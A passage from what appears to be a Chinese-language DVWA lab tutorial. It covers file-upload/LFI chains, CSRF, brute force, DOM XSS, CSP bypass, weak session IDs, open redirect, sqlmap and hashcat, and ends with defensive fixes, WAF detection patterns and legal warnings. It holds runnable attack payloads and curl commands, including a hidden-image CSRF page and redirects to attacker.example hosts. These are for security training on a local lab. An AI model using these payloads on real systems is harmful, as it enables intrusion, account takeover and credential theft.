     'http://localhost:4280/vulnerabilities/upload/' -b '<cookie>' | grep -o 'hackable/uploads/.*'
```

**关键点**：即使上传成功，**文件名是 `pic.php.jpg`，PHP 不会把它当脚本执行**（因为扩展名是 `.jpg`）。**要真正拿到 RCE，还需要另一个条件**：比如配合**文件包含**（`fi` 模块）把该文件当 PHP 执行，或利用服务器对多扩展名的错误解析（IIS 的 `;`、Apache 的 `AddHandler` 配置错误等）。

```bash
# 与 fi 组合（这才是利用链）：上传图片马 → 用 LFI 包含它
curl -s 'http://localhost:4280/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/pic.php.jpg' -b '<cookie>'
```

**Impossible**：重新编码图片（`imagecreatefromjpeg` + 保存）、随机化文件名、限制扩展名、放到不可执行目录。**核心思想：不要让用户控制的内容落到可执行的路径上。**

#### 2.7 CSRF（`csrf`）

功能：一个「修改密码」页面，靠 URL 就能改。

**Low** 源码：`$_GET['password_new']` / `$_GET['password_conf']`，**没有 token、没有确认旧密码**。

```bash
# 攻击者构造的「恶意页面」只需一个 <img>（受害者浏览器自动发请求）：
#   <img src="http://localhost:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
# 在靶场里直接模拟这个请求：
curl -s --get 'http://localhost:4280/vulnerabilities/csrf/' \
     --data-urlencode 'password_new=hacked' \
     --data-urlencode 'password_conf=hacked' \
     --data-urlencode 'Change=Change' -b '<cookie>' | grep -o 'Password Changed.*'
```
```console
Password Changed.
```
→ 密码被改了。**验证**：退出登录，用 `admin` / `hacked` 登录成功。

> 改完记得 **Setup DVWA → Create / Reset Database** 复原。

```bash
# 自己做一个「恶意页面」验证社工链（放在本地静态服务器）
cat > /tmp/evil.html <<'EOF'
<html><body>
<h1>You won a prize!</h1>
<img src="http://localhost:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
</body></html>
EOF
python3 -m http.server 9000 --directory /tmp &
# 用「已登录 DVWA 的浏览器」访问 http://127.0.0.1:9000/evil.html → 图片请求自动带上 DVWA 的 Cookie
```

**Medium** 源码：
```php
if ( stripos( $_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'] ) !== false ) { ... }
```
**只检查 Referer 里有没有服务器名**——`stripos` 是「包含」判断，所以：

```bash
# ① 直接不带 Referer（某些浏览器/隐私设置下 Referer 为空 → stripos(false) 判断异常）
# ② 或构造一个「Referer 里包含目标主机名」的域名，例如：
#    http://localhost.attacker.example/evil.html      ← Referer 里含 "localhost"
#    或者把恶意页面放在 http://localhost:9000/
# ③ 最经典的绕过：Referer 检查形同虚设时直接省略头
curl -s --get 'http://localhost:4280/vulnerabilities/csrf/' \
     --data-urlencode 'password_new=hacked2' --data-urlencode 'password_conf=hacked2' \
     --data-urlencode 'Change=Change' -b '<cookie>' -H 'Referer;' | grep -o 'Password Changed.*'
```

**High** 源码（**重要，值得细看**）：

```php
if ($_SERVER['REQUEST_METHOD'] == "POST" && $_SERVER['CONTENT_TYPE'] == "application/json") {
    $data = json_decode(file_get_contents('php://input'), true);
    if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) && ...) { ... }
} else {
    if (array_key_exists("user_token", $_REQUEST) && ...) { ... }
}
// 后面还有 checkToken(...) 校验
```

**它这次真的用了 CSRF token**（并支持通过**自定义请求头 `USER_TOKEN`** 传递）。**验证 token 是否真的拦住了你**：

```bash
# 不带 user_token 直接请求 → 应该被拦
curl -s --get 'http://localhost:4280/vulnerabilities/csrf/' \
     --data-urlencode 'password_new=hacked3' --data-urlencode 'password_conf=hacked3' \
     --data-urlencode 'Change=Change' -b '<cookie>' | grep -o 'Password Changed\|Invalid token\|Request Failed'
```

```console
Request Failed        ← token 校验生效
```

**Impossible**：token + **要求输入当前密码** + `PDO` 参数化。

**这一节的收获**：**「Referer 校验」不是 CSRF 防护**（可伪造、可省略）；**CSRF token 才是**——而且 token 必须是**服务端生成、与用户会话绑定、一次性或有时效**的。

#### 2.8 Brute Force（`brute`）

**Low**：无限制、无延时。

```bash
# 用字典跑（这里用很小的示意字典；真实练习可用 04-口令攻击/wordlists.md）
printf 'password\n123456\nadmin\nletmein\n' > /tmp/pw.txt
while read -r p; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    --get 'http://localhost:4280/vulnerabilities/brute/' \
    --data-urlencode 'username=admin' --data-urlencode "password=$p" \
    --data-urlencode 'Login=Login' -b '<cookie>')
  echo "$p -> $code"
done < /tmp/pw.txt
```

**Medium**：`sleep( 2 )` 在失败时 —— 暴力破解被**拖慢**：

```bash
# 观察单次请求耗时
time curl -s --get 'http://localhost:4280/vulnerabilities/brute/' \
  --data-urlencode 'username=admin' --data-urlencode 'password=wrongpw' \
  --data-urlencode 'Login=Login' -b '<cookie>' >/dev/null
```
```console
real    0m2.0xx s      ← 每次失败都要等 2 秒
```

**High**：**要求 CSRF token + `sleep( rand(0,3) )`**。

```bash
# 必须每个请求先取一次 token（token 在校验后被重新生成）
# 用 ZAP 的 Fuzzer 或 Burp 的 Intruder 更实用：先抓包，把 token 位置设为「动态取」
```

**Impossible**：token + **失败 3 次锁定账号**。

**输出解读与下一步**：

| 响应特征 | 含义 |
|----------|------|
| 状态码/长度与失败响应一致 | 密码错误 |
| 响应里出现 `Welcome to the password protected area` | **登录成功** |
| 单次请求耗时 ~2s | medium：有 sleep |
| 每次请求前需要重新抓 token | high/impossible |

**真实场景的启发**：**「速率限制 + 账号锁定 + 强密码 + MFA」** 是防爆破的组合拳。DVWA 用四级实现了这个思路。

#### 2.9 XSS (DOM)（`xss_d`）

**Low**：`# No protections, anything goes`——看前端 JS 怎么用 URL 参数。

```bash
# 在浏览器打开（DOM XSS 需要浏览器执行 JS）
# http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```
```
# Low 级别的 JS 直接把它写进页面 → 弹窗
```

**Medium** 源码：`if (stripos($default, "<script") !== false) { header("location: ?default=English"); exit; }`
**只查 `"<script"` 这个子串**：

```bash
# 用不含 "<script" 的注入（DOM 型：参数是先到 URL fragment，再由 JS 处理）
# http://localhost:4280/vulnerabilities/xss_d/?default=</select><img src=1 onerror=alert(1)>
# 或利用 URL fragment（# 后面的内容不发给服务器，服务端过滤看不到）
# http://localhost:4280/vulnerabilities/xss_d/#default=<script>alert(1)</script>
```

**High**：`switch` **白名单只有 French/English/German/Spanish** → 基本打不动（**这就是「白名单」的正确姿势**）。

**解读**：**DOM 型 XSS 的输入不经过服务器**（尤其 `#` fragment 部分），所以**服务端过滤完全无效**——必须在前端用 `textContent` 而不是 `innerHTML`，并做**前端输出编码**。

#### 2.10 CSP Bypass（`csp`）

**Low** 源码：CSP 允许一堆外部域名：

```php
"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;"
```

页面允许你**提交一个外部脚本 URL** 并把它插入页面。**任务：找一个「被 CSP 白名单允许、但你能在上面放 JS」的域名**。

```bash
# 思路：白名单里有 unpkg.com / cdn.jsdelivr.net（可托管任意 npm 包）
#   源码注释里甚至给了两个示例：
#     https://cdn.jsdelivr.net/gh/digininja/csp_bypass/alert.js
#     https://unpkg.com/@digininja/csp_bypass@1.0.0/index.js
# 在页面的 include 输入框里填其中一个 → 弹窗
```

**Medium** 源码：
```php
"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';"
```
**nonce 直接写在源码里**（硬编码 = 等于没写）：

```html
<!-- 页面会把你的输入原样插入（不加 <script> 标签），所以自带标签 + 用源码里泄漏的 nonce -->
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

**High** 源码：`"Content-Security-Policy: script-src 'self';"` + 页面调用 `source/jsonp.php`。
**只能执行同源脚本** → 任务变成「让同源的 `jsonp.php` 输出我想要的东西」（JSONP 的回调函数名可控 → 是一个经典的高级别绕法）。

**Impossible**：CSP 不再允许 `'unsafe-inline'`、nonce 随机、只允许 `'self'` 且脚本也做了转义。

**这一节的价值**：CSP 是**纵深防御**，不是「一次配好就安全」——**`'unsafe-inline'`、硬编码 nonce、白名单里有 CDN（可托管任意内容）** 都是常见削弱点。

#### 2.11 Weak Session IDs（`weak_id`）

**Low**：`$_SESSION['last_session_id']++` → Cookie 值是 **1, 2, 3…**

```bash
for i in 1 2 3; do
  curl -s -i 'http://localhost:4280/vulnerabilities/weak_id/' --data 'x=1' -b '<cookie>' | grep -o 'dvwaSession=[0-9]*'
done
```
```console
dvwaSession=1
dvwaSession=2
dvwaSession=3      ← 完全可预测
```

**Medium**：`$cookie_value = time();` → **时间戳**（可预测，误差窗口内可枚举）。

**High**：`md5($_SESSION['last_session_id_high'])` → 值是 `md5(1)`,`md5(2)`…**看着像随机，其实可枚举**：

```bash
for i in 1 2 3; do echo -n "$i" | md5sum | cut -d' ' -f1; done
```
```console
c4ca4238a0b923820dcc509a6f75849b      ← md5("1")
c81e728d9d4c2f636f067f89cc14862c      ← md5("2")
eccbc87e4b5ce2fe28308fd9f2a7baf3      ← md5("3")
```

**解读**：**「看起来随机」不等于「不可预测」**。正确做法是**使用密码学安全随机数**并**足够长**（现代框架默认都做到，可对照 `impossible`）。

#### 2.12 JavaScript Attacks（`javascript`）

**Low**：token 由**前端 JS** 计算（`md5(rot13(phrase))`）——**算法全在页面里**。

```bash
# 页面上输入 new value，JS 生成 token。直接读页面源码就能反推算法
curl -s 'http://localhost:4280/vulnerabilities/javascript/' -b '<cookie>' | grep -o 'md5(rot13(phrase))'
```

**Medium**：算法挪到了外部文件 `source/medium.js`——**还是可以下载分析**：

```bash
curl -s 'http://localhost:4280/vulnerabilities/javascript/source/medium.js'
```

**High**：`source/high.js`，通常会做**混淆**（反调试/编码/拆分）——**但客户端代码永远可分析**。

**核心结论**：**客户端校验只是「体验优化」，不是安全边界**。任何「前端算出来的合法性证明」都可以被绕过。正确做法是**服务端重新校验**（对照 `impossible`）。

#### 2.13 Open HTTP Redirect（`open_redirect`）

**Low** 源码：`header("location: " . $_GET['redirect']);` ——**任意跳转**。

```bash
curl -s -i 'http://localhost:4280/vulnerabilities/open_redirect/?redirect=https://example.com/' -b '<cookie>' | grep -i '^location:'
```
```console
location: https://example.com/
```
→ **钓鱼链的原料**：`http://target/vulnerabilities/open_redirect/?redirect=http://evil.example/login`，链接前缀是**可信域名**。

**Medium**：`preg_match("/http:\/\/|https:\/\//i", ...)` 拦绝对 URL：

```bash
# ① 协议相对 URL（不带 scheme）
curl -s -i 'http://localhost:4280/vulnerabilities/open_redirect/?redirect=//example.com/' -b '<cookie>' | grep -i '^location:'
# ② 大小写/编码变形（正则只是表层检查）
# ③ 白名单外域但用「路径」绕过
```

**High**：`strpos($_GET['redirect'], "info.php") !== false` ——**要求 URL 里包含 `info.php`**：

```bash
# 用「查询串里带 info.php」或「开头是合法目标、后面跳走」的构造绕过
# 例如：redirect=info.php@evil.example  /  redirect=info.php?x=//evil.example
```

**Impossible**：**只允许白名单内的固定目标**（用 ID 映射，而不是直接接受 URL）。

#### 2.14 其余模块（练习方式相同）

| 模块 | 练什么 | Low 的起点 | 观察重点 |
|------|--------|------------|----------|
| `sqli_blind` | 布尔盲注 / 时间盲注 | `1' AND '1'='1` vs `1' AND '1'='2` 看响应差异 | **响应内容不变但行为变**——所以要靠「真/假」或「延时」判断 |
| `captcha` | 弱验证码流程 | 绕过步骤校验（先改密码后验码） | **顺序与状态校验** |
| `cryptography` | 弱加密 / 密钥管理 | 看源码里的加密方式与 IV/密钥来源 | ECB、固定 IV、硬编码密钥 |
| `bac` | 授权绕过 | 改请求里的用户 ID / 直接访问管理接口 | **水平越权 / 垂直越权** |
| `authbypass` | 认证绕过 | 看登录逻辑的短路条件 | 逻辑漏洞 |
| `api` | API 安全 | 未授权访问、参数注入 | **没有前端保护时的服务端行为** |

**练习方法完全一致**：**View Source → low 打通 → 依次升级 → 对照 impossible**。

### 场景 3：与工具联动 + 从 impossible 学修复

**3a. 用 ZAP 做「自动发现 + 手工确认」**（详见 [`zaproxy.md`](zaproxy.md)）

```bash
# ① Context 限定 localhost:4280，浏览器代理设为 127.0.0.1:8080
# ② 正常浏览 DVWA 各模块（被动扫描自动跑）
# ③ 右键站点 → Attack → Spider → 再 Attack → Active Scan
zaproxy -cmd -quickurl http://localhost:4280/ -quickout /tmp/dvwa-zap.html -quickprogress
```
**你会看到 ZAP 报出**：SQL Injection / XSS / Path Traversal / Command Injection / 缺 CSRF token / 缺安全响应头…**与你在场景 2 里手工打通的完全对应**。

**3b. 用 sqlmap 深挖 SQL 注入**（详见 [`sqlmap.md`](sqlmap.md)）

```bash
# 先用 ZAP/Burp 抓一个 low 级别的 sqli 请求，存成 /tmp/req.txt，然后：
sqlmap -r /tmp/req.txt --batch --dbs
sqlmap -r /tmp/req.txt --batch -D dvwa -T users --dump
```

```console
# sqlmap 会 dump 出 users 表（含 md5 密码）—— 与场景 2.1 手工 UNION 的结果一致
```

**3c. 用离线工具破 md5 密码**（把链路补完，详见 [`hashcat.md`](../04-口令攻击/hashcat.md)）

```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > /tmp/md5.txt
hashcat -m 0 /tmp/md5.txt /usr/share/wordlists/rockyou.txt.gz --force 2>/dev/null || true
# 5f4dcc3b5aa765d61d8327deb882cf99 → password
```

**3d. 从 `impossible` 反推「修复清单」**

把每个模块的 `impossible.php` 看一遍，整理成一张「正确实现对照表」：

| 漏洞 | impossible 的写法 | 迁移到真实项目 |
|------|-------------------|----------------|
| SQL 注入 | `prepare()` + `bindParam(PDO::PARAM_INT)` | 全部用参数化查询 / ORM 绑定变量 |
| XSS | `htmlspecialchars($s, ENT_QUOTES)` | 按输出上下文编码（HTML/JS/URL/CSS） |
| 命令注入 | 白名单 + `escapeshellarg()`，或**不调用 shell** | 用 `exec` 的数组形式；禁止拼接 |
| 文件包含 | 固定白名单映射 | 不把用户输入当路径；用 ID 映射 |
| 文件上传 | 重新编码图片 + 随机文件名 + 不可执行目录 | 对象存储 + 独立域名 + `Content-Disposition` |
| CSRF | `checkToken()` + 陈旧密码校验 | 每请求 token（或 SameSite Cookie + 自定义头） |
| 会话 | `HttpOnly` + `SameSite=Strict` + `session_regenerate_id()` | 框架默认会话策略 + 登录后重生成 |
| 认证 | token + 失败锁定 | 速率限制 + MFA + 账号锁定 |
| 重定向 | 白名单 ID 映射 | 禁止开放重定向；用内部路由名 |
| 加密 | 标准算法 + 随机 IV + 密钥管理 | 用成熟库；密钥放 KMS |

**3e. 清理环境**

```bash
cd /tmp/DVWA && docker compose down -v      # -v 连数据卷一起删
docker rm -f dvwa-web dvwa-db 2>/dev/null
sudo dvwa-stop                               # 如果用的是 Kali 包
```

---

## 6. 输出解读

DVWA 是 Web 应用，这里的「输出」指**怎么判断漏洞是否成立**。

### 6.1 通用判据

| 现象 | 含义 | 下一步 |
|------|------|--------|
| 响应里出现**本不该出现的数据**（其他用户、系统文件、命令输出） | **漏洞成立** | 记录请求 + 响应作为证据 |
| 浏览器**弹窗/执行脚本** | XSS 成立 | 换成「偷 Cookie / 发请求」验证危害（**仅限自己的靶场**） |
| 响应**长度/状态码**与基线不同 | 可能是漏洞（也可能是随机内容） | 多次重复，确认**可稳定复现** |
| 响应**耗时**明显变化（如 2s） | 可能有 sleep（限速）或**时间盲注命中** | 用「真/假」成对请求对比 |
| 浏览器 `View Source` 里 payload 被转义成 `&lt;` | **输出编码生效** | 该级别防住了 |
| 报 `Invalid token` / `Request Failed` | **token 校验生效** | 该级别防住了 |
| `is_numeric` 类校验后页面空白 | **类型白名单生效** | 该级别防住了 |

### 6.2 每级「通关」的判断标准

| 级别 | 通关标准 |
|------|----------|
| **low** | 用最直接的 payload 拿到「不该拿到的结果」 |
| **medium** | **说清过滤做了什么、为什么不够**，并给出绕过 payload |
| **high** | 找到过滤的**盲区**（大小写/编码/协议/顺序/字符集）并绕过 |
| **impossible** | **打不动**才算通关——并且能说出**为什么打不动**（对齐到源码） |

> **真正的「通关」不是「打通了」，而是「能对着源码解释为什么这一级防住了/没防住」。**

### 6.3 记录与产出

练习时建议维护一张自己的表格（这就是「学习留痕」）：

| 模块 | 级别 | 过滤实现（源码要点） | payload | 结果 | 成立的根因 |
|------|------|---------------------|---------|------|------------|
| sqli | low | 无，直接拼接 | `1' OR '1'='1` | 5 行 | 未参数化 |
| sqli | medium | `mysqli_real_escape_string` 但 SQL 无引号 | `1 OR 1=1` | 5 行 | 转义与拼接方式不匹配 |
| sqli | high | 输入取自 session + `LIMIT 1` | `1' UNION SELECT ... #` | 逐行 | `#` 注释掉 LIMIT |
| sqli | impossible | token + `is_numeric` + PDO | —— | 0 行 | 参数化查询 |

---

## 7. 与其他工具配合

```
   ① 靶场就位：dvwa（localhost:4280）← 本文
        │
   ② 代理与手工测试
      zaproxy（浏览器代理 + 被动/主动扫描）   zaproxy.md
      mitmproxy（脚本化改包）                 ../07-嗅探与欺骗/mitmproxy.md
      tcpdump/wireshark（看原始流量）         ../07-嗅探与欺骗/
        │
   ③ 专用工具深挖
      SQL 注入     → sqlmap                    sqlmap.md
      命令注入     → commix                     commix.md
      目录/参数    → gobuster / ffuf / dirb     gobuster.md、ffuf.md、dirb.md
      Web 指纹     → whatweb                    ../01-信息搜集/whatweb.md
      WAF 探测     → wafw00f                    wafw00f.md
      WordPress    → wpscan                     wpscan.md
      服务器配置   → nikto                      ../02-漏洞分析/nikto.md
      缓存类       → wcvs                       ../02-漏洞分析/web-cache-vulnerability-scanner.md
        │
   ④ 把结果用起来
      dump 出的 hash → hashcat / john           ../04-口令攻击/hashcat.md、john.md
      抓到的握手/凭据 → 见 04/05 分类           ../04-口令攻击/、../05-无线攻击/
        │
   ⑤ 报告
      cherrytree / dradis                       ../11-社会工程与报告/
```

**推荐学习路径**：

```
DVWA low 全部打通   → 理解「漏洞长什么样」
      ↓
DVWA medium/high    → 理解「防护怎么被绕过」
      ↓
DVWA impossible     → 理解「正确实现」
      ↓
用 ZAP 自动扫一遍    → 看工具能不能发现你手工找到的洞（训练「工具 vs 手工」的边界感）
      ↓
换 Juice Shop / bWAPP → 扩大覆盖面
      ↓
VulnHub / HTB 靶机   → 练完整渗透链（信息搜集 → 利用 → 提权）
```

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| 打开页面显示 `Could not connect to the database` | **没有初始化数据库**（最常见） | 访问 `setup.php` → **Create / Reset Database** |
| 登录后每个模块都提示连接错误 | `config/config.inc.php` 里的数据库账号密码不对 | 与 `compose.yml` 里的 `MYSQL_*` 环境变量对照 |
| 端口 4280 访问不通 | 容器没起来 / 端口冲突 | `docker compose ps`、`docker compose logs dvwa`；改 `compose.yml` 端口 |
| `docker compose up` 报找不到文件 | 用了旧版命令 `docker-compose`，或不在 `DVWA` 目录 | 用 `docker compose`（v2）；`cd` 到有 `compose.yml` 的目录 |
| 数据库容器先起来了但 Web 报错 | Web 比 DB 快，DB 还没初始化完 | 等 10-30 秒重试；或 `docker compose restart dvwa` |
| 改了安全级别不生效 | 级别在 **Cookie** 里 | 检查 Cookie `security`；或重新在 DVWA Security 页面 Submit |
| 「重置数据库」后我的练习数据没了 | 这是预期行为 | 正常；要保留就先备份 |
| 上传的 webshell 访问返回源码/404 | 文件不在 Web 根的可访问路径；或 PHP 没解析该扩展名 | 确认路径是 `hackable/uploads/xxx.php`；配合 `fi` 模块包含 |
| 图片马传上去了但不执行 | 文件名是 `xxx.jpg`，PHP 不解析 | **这就是 high 级别防住的地方**；要利用需配合其他条件（LFI / 服务器解析错误配置） |
| CSRF 模块改完密码自己登不上了 | 密码真的被改了 | **Setup DVWA → Create / Reset Database** |
| `sqlmap` 注入不成功 | 会话/参数/级别不对（如 high 的输入在 session） | 先在 ZAP 里手工确认注入点，再把**完整请求**交给 sqlmap（`-r req.txt`） |
| ZAP 主动扫描把 DVWA 打崩 | 容器资源不足 | 给 Docker 更多资源；或缩小扫描范围、降速 |
| `allow_url_include` 相关 RFI 不成功 | PHP 默认关闭 | 这只是**环境限制**，LFI 依然成立；不要为了「打通」去改生产式配置 |
| 模块列表和本文不一致 | **版本差异** | 以你部署版本的左侧菜单为准；源码在 `/usr/share/dvwa/vulnerabilities/` 或容器 `/var/www/html/vulnerabilities/` |
| Kali 包与 Docker 版行为不同 | 打包版本可能做了调整（如路径、端口 42001 vs 4280） | 用 `dvwa-start` 时以 42001 为准；一切以页面提示为准 |

---

## 9. 防御视角（蓝队 / 开发）

DVWA 的最大价值就是**`impossible` 级别的四份源码 = 一份现成的安全编码教材**。

| 漏洞类 | 错误做法（low/medium/high 里都能看到） | 正确做法（impossible / 生产建议） |
|--------|----------------------------------------|-----------------------------------|
| SQL 注入 | 字符串拼接；只做 `real_escape_string` 但拼接方式变了 | **参数化查询**（Prepared Statement / ORM 绑定变量） |
| XSS | 黑名单过滤 `<script>`；只在客户端过滤 | **按上下文输出编码**（HTML/属性/JS/URL/CSS 各不同）；CSP 作为纵深防御 |
| 命令注入 | 黑名单符号；拼接 shell 命令 | **不调用 shell**；必须调用时用参数数组 + `escapeshellarg` |
| 文件包含 | 删 `../`、前缀匹配 | **固定白名单映射**（ID → 文件名）；`open_basedir` 限制 |
| 文件上传 | 信任客户端 MIME；只查扩展名 | **服务端重新编码** + 随机文件名 + **存到不可执行目录/对象存储** + 独立域名 |
| CSRF | 只查 Referer | **token**（会话绑定）+ `SameSite` Cookie + 敏感操作二次确认（当前密码/OTP） |
| 认证/爆破 | 无限制；只加 sleep | **速率限制 + 账号锁定 + MFA + 强密码策略** |
| 会话 ID | 自增 / 时间戳 / `md5(自增)` | **密码学安全随机数** + 足够长度 + 登录后 `session_regenerate_id()` |
| 会话 Cookie | 无 `HttpOnly`/`SameSite` | `HttpOnly; Secure; SameSite=Strict` |
| 开放重定向 | 直接 `Location: 用户输入` | **白名单 ID 映射**，绝不回跳用户提供的绝对 URL |
| 加密 | 硬编码密钥 / 固定 IV / ECB | 成熟加密库 + 随机 IV + 密钥托管（KMS）+ AEAD |
| 授权 | 只在 UI 隐藏功能 | **服务端逐请求鉴权**（水平 + 垂直） |
| 客户端校验 | 全在前端算 | **服务端重算**（前端只做体验） |

**蓝队的四条硬建议**：

1. **用 DVWA 的 `impossible` 做开发培训材料**——比讲十页 PPT 有用；
2. **把 DVWA 放进「禁止上公网」的资产清单**（官方原文警告过），并接入内部扫描确认它没被暴露；
3. **CI 里用 ZAP 对内部应用做被动扫描**，把「缺安全响应头 / Cookie 属性不全」这类**零风险检查**常态化；
4. **别把「扫不到」当成「修好了」**——用 DVWA 的 medium/high 提醒团队：**弱过滤会给人虚假的安全感**。

**检测「有人在打 DVWA/类似靶场」**：如果是真实业务系统，看到 DVWA 里那些 payload（`' OR '1'='1`、`<script>alert`、`; id`、`../etc/passwd`）出现在日志里，**那就是真实攻击**——把它们变成 WAF 规则和告警规则：

```
① URI/参数中出现 SQL 元字符组合（引号 + OR/UNION/SELECT）
② 参数中出现 <script / onerror= / javascript:
③ 参数中出现 ; / | / && / ` / $( )  且目标是会调用 shell 的参数
④ 路径中出现 ../ 或 %2e%2e%2f 的重复组合
⑤ 同一来源短时间内大量失败登录（爆破）
⑥ 请求里出现已知 webshell 文件名（.php 上传后马上访问）
```

---

## 10. 参考

- Kali 工具页（含 `dvwa-start` / `dvwa-stop` 输出）：<https://www.kali.org/tools/dvwa/>
- 上游仓库（含 README、`compose.yml`、各模块源码）：<https://github.com/digininja/DVWA>
- 官方 Docker 说明与故障排查：<https://github.com/digininja/DVWA#docker>
- 源码目录（练习必读 `source/low.php` → `source/impossible.php`）：
  - 容器内：`docker compose exec dvwa ls /var/www/html/vulnerabilities/`
  - Kali 包：`ls /usr/share/dvwa/vulnerabilities/`
- 本地命令：`sudo dvwa-start`、`sudo dvwa-stop`、`docker compose up -d`、`docker compose logs dvwa`
- 配套教程：[`zaproxy.md`](zaproxy.md)、[`sqlmap.md`](sqlmap.md)、[`commix.md`](commix.md)、[`gobuster.md`](gobuster.md)、[`../02-漏洞分析/web-cache-vulnerability-scanner.md`](../02-漏洞分析/web-cache-vulnerability-scanner.md)

## ⚠️ 法律与伦理

DVWA 是**故意不安全的软件**，围绕它有三条必须守住的线：

**① 绝不部署到公网**

官方 README 原文警告：

> 「Do not upload it to your hosting provider's public html folder or any Internet facing servers, as they will be compromised.」
>
> （不要把 DVWA 上传到主机商的 `public_html` 或任何面向互联网的服务器，**它们会被攻陷**。）

- `compose.yml` 默认绑 `127.0.0.1` 是**刻意设计**。**去掉这个绑定等于把一台可 RCE 的主机放到网上**；
- 一旦被搜索引擎/Shodan 收录，会在**数小时内**被打成跳板——**此时你可能要为主机的非法用途承担责任**。

**② 只在你自己的靶场上练习**

- 把 DVWA 里的 payload（`' OR '1'='1`、`<script>`、`; id`、`../etc/passwd`）**用到任何非授权系统上**，都可能触犯：
  - 《网络安全法》第 27 条（不得非法侵入、干扰他人网络）；
  - 《刑法》第 285 条（非法获取计算机信息系统数据）、**第 286 条（破坏计算机信息系统）**；
- 本教程的**全部演练都只针对你自己启动的 DVWA 实例**。

**③ 上传/使用的「恶意文件」要严格管理**

- 练习用的 PHP webshell、图片马等，**只应在一次性靶场里存在**；
- **不要**把它们（连同利用链细节）分享到公开渠道——这属于**提供侵入工具**，可能触犯《刑法》第 285 条之一；
- 容器用完**立即销毁**（`docker compose down -v`）。

**其他注意点**：

- 用 **Kali 官方包**或 **Docker 隔离环境**部署；不要装在生产系统上；
- 靶场里乱输的东西会真进数据库，**不要放任何真实数据/凭据**；
- 如果要用 DVWA 做**团队培训**：只在隔离网段、临时开放、培训结束立即销毁，并在开放前明确告知参与者「这是靶场」；
- 在**真实项目**里发现的同类漏洞，应通过**负责任的披露流程**上报，不得擅自利用或扩大影响。
